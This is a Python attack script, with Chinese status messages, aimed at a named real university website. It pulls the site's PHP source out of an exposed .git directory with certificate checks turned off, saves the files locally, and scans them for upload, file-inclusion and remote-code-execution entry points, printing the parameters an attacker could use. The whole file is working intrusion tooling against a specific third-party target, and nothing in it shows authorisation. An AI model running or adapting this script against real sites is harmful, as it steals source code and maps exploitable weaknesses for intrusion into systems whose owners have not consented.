#!/usr/bin/env python3
import requests
import urllib3
import zlib
import re
import os
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

base_url = "https://olympic.su.ac.th/.git"
output_dir = "/tmp/git_php_files"
os.makedirs(output_dir, exist_ok=True)

print("[*] 从.git下载所有文件...")

def parse_tree(tree_data):
    files = []
    pos = 0
    while pos < len(tree_data):
        null_pos = tree_data.find(b'\x00', pos)
        if null_pos == -1:
            break
        
        entry = tree_data[pos:null_pos]
        parts = entry.split(b' ', 1)
        if len(parts) == 2:
            mode = parts[0].decode()
            filename = parts[1].decode()
            
            hash_start = null_pos + 1
            if hash_start + 20 <= len(tree_data):
                file_hash = tree_data[hash_start:hash_start+20].hex()
                files.append((mode, filename, file_hash))
        
        pos = null_pos + 21
    return files

def download_tree(tree_hash, path=""):
    tree_path = f"{base_url}/objects/{tree_hash[:2]}/{tree_hash[2:]}"
    tree_resp = requests.get(tree_path, verify=False, timeout=5)
    
    if tree_resp.status_code != 200:
        return []
    
    tree_data = zlib.decompress(tree_resp.content)
    all_files = []
    
    entries = parse_tree(tree_data)
    for mode, filename, file_hash in entries:
        if mode.startswith('4'):  # tree
            sub_files = download_tree(file_hash, f"{path}{filename}/")
            all_files.extend(sub_files)
        else:  # blob
            all_files.append((f"{path}{filename}", file_hash))
    
    return all_files

root_tree = "206be85b2f5820dcbb812b49c73c77c48027d4d3"
all_files = download_tree(root_tree)

print(f"[+]{len(all_files)} 个文件")

php_files = [f for f in all_files if f[0].endswith('.php')]
print(f"[+] 找到 {len(php_files)} 个PHP文件")

vuln_files = []

for file_path, file_hash in php_files:
    blob_path = f"{base_url}/objects/{file_hash[:2]}/{file_hash[2:]}"
    blob_resp = requests.get(blob_path, verify=False, timeout=5)
    
    if blob_resp.status_code == 200:
        blob_data = zlib.decompress(blob_resp.content)
        null_header = blob_data.find(b'\x00')
        if null_header != -1:
            content = blob_data[null_header+1:]
        else:
            content = blob_data[50:] if len(blob_data) > 50 else blob_data
        
        content_str = content.decode('utf-8', errors='ignore')
        
        safe_path = file_path.replace('/', '_').replace('\\', '_')
        with open(f"{output_dir}/{safe_path}", 'w', encoding='utf-8', errors='ignore') as f:
            f.write(content_str)
        
        vulns = []
        
        if 'move_uploaded_file' in content_str or '$_FILES' in content_str:
            files_params = re.findall(r'\$_FILES\[["\']([^"\']+)["\']\]', content_str)
            upload_paths = re.findall(r'move_uploaded_file\([^,]+,\s*["\']([^"\']+)["\']', content_str)
            if files_params:
                vulns.append(('upload', files_params, upload_paths))
                print(f"[!] {file_path} - 上传漏洞")
                print(f"    参数: {files_params}")
                print(f"    路径: {upload_paths}")
        
        if ('include' in content_str.lower() or 'require' in content_str.lower()) and ('$_GET' in content_str or '$_POST' in content_str):
            include_code = re.findall(r'(include|require)[^;]+;', content_str, re.IGNORECASE | re.DOTALL)
            get_params = re.findall(r'\$_GET\[["\']([^"\']+)["\']\]', content_str)
            post_params = re.findall(r'\$_POST\[["\']([^"\']+)["\']\]', content_str)
            if get_params or post_params:
                vulns.append(('include', get_params + post_params, include_code[:3]))
                print(f"[!] {file_path} - 文件包含")
                print(f"    参数: {list(set(get_params + post_params))}")
        
        if ('eval' in content_str.lower() or 'system' in content_str.lower() or 'exec' in content_str.lower()) and ('$_GET' in content_str or '$_POST' in content_str):
            rce_code = re.findall(r'(eval|system|exec|shell_exec|passthru)[^;]+;', content_str, re.IGNORECASE)
            get_params = re.findall(r'\$_GET\[["\']([^"\']+)["\']\]', content_str)
            post_params = re.findall(r'\$_POST\[["\']([^"\']+)["\']\]', content_str)
            if get_params or post_params:
                vulns.append(('rce', get_params + post_params, rce_code[:3]))
                print(f"[!] {file_path} - RCE")
                print(f"    参数: {list(set(get_params + post_params))}")
        
        if vulns:
            vuln_files.append((file_path, vulns))

print(f"\n[+] 下载完成，发现 {len(vuln_files)} 个有漏洞的文件")
